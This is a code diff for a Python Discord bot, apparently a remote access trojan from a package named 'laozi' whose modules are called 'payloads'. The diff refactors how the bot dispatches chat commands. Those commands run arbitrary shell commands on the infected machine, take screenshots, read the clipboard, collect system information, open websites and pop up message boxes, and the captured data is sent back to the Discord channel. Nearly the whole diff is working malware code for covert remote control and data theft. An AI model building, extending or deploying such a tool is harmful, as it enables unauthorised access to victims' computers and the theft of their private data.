@@ -1,18 +1,16 @@
 import os
-
 import discord
-
 from laozi.payloads.systeminfo import get_sys_info
 from laozi.payloads.clipboard import get_clipboard
 from laozi.payloads.screenshot import get_screenshot
+from laozi.payloads.website import open_website
 from laozi.payloads.messagebox import display_messagebox
 
 
 def load_environment_variables(file_path="../.env"):
-    with open(file_path) as env_file:
-        for line in env_file:
-            line = line.strip()
-            if line and not line.startswith("#"):
+    with open(file_path) as f:
+        for line in f:
+            if line.strip() and not line.startswith("#"):
                 key, value = line.split("=", 1)
                 os.environ[key.strip()] = value.strip()
 
@@ -26,58 +24,55 @@ class DiscordBotClient(discord.Client):
         channel = self.get_channel(self.target_channel_id)
         if channel:
             await channel.send("@everyone Hello!")
-        else:
-            print(f"Channel with ID {self.target_channel_id} not found.")
 
     async def on_message(self, message):
         if message.author == self.user:
             return
 
-        command = message.content.lower()
+        command, *args = message.content.strip().split(maxsplit=1)
+        args = args[0] if args else ""
 
-        if command == "!sysinfo":
-            await self.handle_system_info(message.channel)
-        elif command.startswith("!execute"):
-            self.execute_shell_command(command[9:])
-        elif command.startswith("!alert"):
-            self.trigger_messagebox(command[7:])
-        elif command.startswith("!clipboard"):
-            await self.handle_clipboard(message.channel)
-        elif command.startswith("!screenshot"):
-            await self.handle_screenshot(message.channel)
+        commands = {
+            "!sysinfo": self.handle_system_info,
+            "!execute": self.execute_shell_command,
+            "!alert": self.trigger_messagebox,
+            "!clipboard": self.handle_clipboard,
+            "!website": open_website,
+            "!screenshot": self.handle_screenshot,
+        }
 
-    async def handle_system_info(self, channel):
-        system_info = get_sys_info()
-        basic_info, detailed_info = self.split_system_info(system_info)
+        handler = commands.get(command)
+        only_one_arg = ["!execute", "!alert", "!website"]
+        if handler:
+            if command in only_one_arg:
+                handler(args)
+            else:
+                await handler(message.channel, args)
 
-        with open("detailed_sys_info.txt", "w") as detailed_file:
-            detailed_file.write(detailed_info)
+    async def handle_system_info(self, channel, _):
+        sys_info = get_sys_info()
+        lines = sys_info.split("\n", 7)
+        basic = "\n".join(lines[:7])
+        detailed = "\n".join(lines[7:])
 
-        await channel.send(f"```{basic_info}```")
+        with open("detailed_sys_info.txt", "w") as f:
+            f.write(detailed)
+
+        await channel.send(f"```{basic}```")
         await channel.send(file=discord.File("detailed_sys_info.txt"))
         os.remove("detailed_sys_info.txt")
 
-    async def handle_clipboard(self, channel):
-        clipboard_content = get_clipboard()
-        if clipboard_content:
-            await channel.send(f"Clipboard content:\n```{clipboard_content}```")
-        else:
-            await channel.send("Clipboard is empty or unavailable.")
+    async def handle_clipboard(self, channel, _):
+        clipboard_content = get_clipboard() or "Clipboard is empty or unavailable."
+        await channel.send(f"Clipboard content:\n```{clipboard_content}```")
 
-    async def handle_screenshot(self, channel):
+    async def handle_screenshot(self, channel, _):
         screenshot = get_screenshot()
         if screenshot:
             await channel.send(file=discord.File(screenshot))
             os.remove(screenshot)
         else:
             await channel.send("Failed to capture screenshot.")
-
-    @staticmethod
-    def split_system_info(system_info):
-        lines = system_info.split("\n")
-        basic_info = "\n".join(lines[:7])
-        detailed_info = "\n".join(lines[7:])
-        return basic_info, detailed_info
 
     @staticmethod
     def execute_shell_command(command):
